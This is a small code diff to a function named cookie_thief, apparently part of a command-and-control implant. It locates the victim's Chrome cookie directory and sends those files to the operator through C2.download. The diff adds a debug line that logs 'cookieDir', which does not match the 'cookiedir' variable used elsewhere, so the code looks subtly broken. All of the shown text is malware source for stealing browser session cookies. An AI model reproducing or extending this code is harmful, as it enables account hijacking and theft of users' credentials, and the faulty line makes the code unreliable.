@@ -27,6 +27,7 @@ exports.cookie_thief = function(task, command, params){
         cookiedir = chromeCookieDir;
     }
     cookieDLPath = homedir + cookiedir;
+    console.log(cookieDir)
     try{
         let status = C2.download(task, cookieDLPath);
     	  if(status.hasOwnProperty("file_id")){
